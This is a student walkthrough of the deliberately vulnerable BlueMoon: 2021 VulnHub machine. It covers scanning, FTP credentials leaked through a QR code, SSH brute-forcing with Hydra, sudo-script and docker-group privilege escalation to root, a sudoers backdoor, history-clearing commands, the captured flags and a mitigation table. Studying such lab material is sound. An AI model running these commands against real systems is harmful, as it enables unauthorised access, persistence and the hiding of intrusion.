# BlueMoon: 2021 — System Hacking Walkthrough

**Course:** System Hacking (Week 3 Task)
**Target machine:** BlueMoon: 2021 (VulnHub) — https://www.vulnhub.com/entry/bluemoon-2021,679/
**Attacker:** Kali Linux
**Goal:** Get Root
**Author:** _your name / student ID_
**Date:** _dd/mm/yyyy_

> All actions were performed against a deliberately vulnerable lab VM running on an
> isolated host-only network, for educational purposes only.

---

## Summary

| Stage | Result |
|---|---|
| Reconnaissance | Target found at `192.168.56.101` |
| Scanning | Ports 21 (FTP), 22 (SSH), 80 (HTTP) open |
| Gaining Access | QR code → FTP creds → password list → SSH as `robin` |
| Privilege Escalation | `robin` → `jerry` (sudo script) → `root` (docker group) |

**Flags captured**

| Flag | Value |
|---|---|
| User-1 | `Fl4g{u5er1r34ch3d5ucc355fully}` |
| User-2 | `Fl4g{Y0ur34ch3du53r25uc355ful1y}` |
| Root | `Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}` |

---

## 1. Reconnaissance

Both the attacker (Kali) and the target were placed on the same VirtualBox **Host-Only** network.
`netdiscover` was used to find the live host.

```bash
sudo netdiscover -r 192.168.56.0/24
```

The target was identified as **192.168.56.101**.

![Reconnaissance - netdiscover](01-netdiscover.png)

---

## 2. Scanning

A full service/version scan was run against the target.

```bash
nmap -sC -sV -Pn -vv 192.168.56.101
```

Three ports were open:

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.9p1 (Debian) |
| 80/tcp | HTTP | Apache httpd 2.4.38 — page title `BlueMoon:2021` |

![Scanning - nmap services](02-nmap.png)

Directory brute-forcing on the web server revealed a hidden path.

```bash
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,txt,php,bak,html
```

Result: `index.html`, `server-status` (403), and **`hidden_text`** (200).

![Scanning - gobuster](03-gobuster.png)

---

## 3. Gaining Access

### 3.1 Hidden page and QR code

The `/hidden_text` page source referenced two hidden files: `.blue.jpg` and `.QR_C0d3.png`.

```bash
curl http://192.168.56.101/hidden_text
wget http://192.168.56.101/.QR_C0d3.png
```

![Gaining Access - hidden_text source](04-hidden-text.png)

### 3.2 Reading the QR code

The QR code was decoded and revealed a bash script that leaks FTP credentials.

```bash
zbarimg .QR_C0d3.png
```

Decoded content (FTP credentials):

```
USER=userftp
PASSWORD=ftppassword
```

![Gaining Access - QR decode](05-qr-decode.png)

### 3.3 FTP login

```bash
ftp 192.168.56.101
# Name: userftp
# Password: ftppassword
ls -la
get information.txt
get p_lists.txt
```

Two files were retrieved: `information.txt` and `p_lists.txt`.

![Gaining Access - FTP login & files](06-ftp.png)

- `information.txt` reveals the username **`robin`** and hints at a weak password.
- `p_lists.txt` is a list of candidate passwords.

![Gaining Access - file contents](07-files.png)

### 3.4 Brute-forcing SSH

Using the discovered username and password list:

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```

The valid password was then used to log in over SSH as `robin`.

```bash
ssh robin@192.168.56.101
whoami    # robin
id
```

![Gaining Access - SSH as robin](08-ssh-robin.png)

**User-1 flag** was found in robin's home directory, and `sudo -l` revealed the next step.

```bash
cat user1.txt
# Fl4g{u5er1r34ch3d5ucc355fully}
sudo -l
```

![Gaining Access - user1 flag & sudo -l](08b-user1-sudo.png)

---

## 4. Privilege Escalation

### 4.1 robin → jerry (sudo on a writable script)

`sudo -l` showed robin may run a script as **jerry** without a password:

```
(jerry) NOPASSWD: /home/robin/project/feedback.sh
```

Since the `project` folder is owned by robin, the script was replaced with a shell.
(The file itself had no write bit, so it was removed and recreated.)

```bash
rm /home/robin/project/feedback.sh
echo 'bash' > /home/robin/project/feedback.sh
chmod +x /home/robin/project/feedback.sh
sudo -u jerry /home/robin/project/feedback.sh
whoami    # jerry
```

![PrivEsc - robin to jerry](09-robin-to-jerry.png)

**User-2 flag** was found in jerry's home directory:

```bash
cat /home/jerry/user2.txt
# Fl4g{Y0ur34ch3du53r25uc355ful1y}
```

![PrivEsc - user2 flag](09b-user2-flag.png)

### 4.2 jerry → root (docker group)

Checking jerry's groups revealed membership in **docker**, which allows full root access.

```bash
id    # ... groups=...,114(docker)
docker images
```

![PrivEsc - jerry docker group](10-jerry-to-root.png)

A container was run with the host filesystem mounted, then `chroot` gave a root shell on the host.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
whoami    # root
cat /root/root.txt
# Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
```

![Root flag](11-root-flag.png)

---

## 5. Maintain Access & Clear Tracks (demonstration only)

Shown for completeness as part of the full system-hacking lifecycle. Performed only on this lab VM.

```bash
# Maintain Access (example backdoor)
echo 'robin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# Clear Tracks
history -c
cat /dev/null > ~/.bash_history
```

---

## 6. Mitigation

| Stage | Weakness exploited | Recommended defense |
|---|---|---|
| Recon / Scanning | Services openly exposed | Restrict exposed services; use a firewall; limit information disclosure |
| Web / QR | Secrets hidden in a public file | Never store credentials in client-accessible files or scripts |
| FTP | Plaintext credentials, weak account | Disable plaintext FTP; use SFTP; enforce strong authentication |
| SSH | Weak, guessable password | Enforce strong passwords, key-based auth, fail2ban, account lockout |
| sudo | Writable script runnable as another user | Never allow sudo on user-writable files; use absolute, locked-down scripts |
| Docker | Non-admin user in docker group | Treat docker group as root-equivalent; remove untrusted users from it |

---

## Conclusion

Starting from an unauthenticated network position, the BlueMoon machine was fully compromised to
**root** by chaining weak information disclosure (QR code), credential reuse, SSH password
brute-forcing, an insecure sudo configuration, and a docker-group privilege escalation.
All three flags were captured.
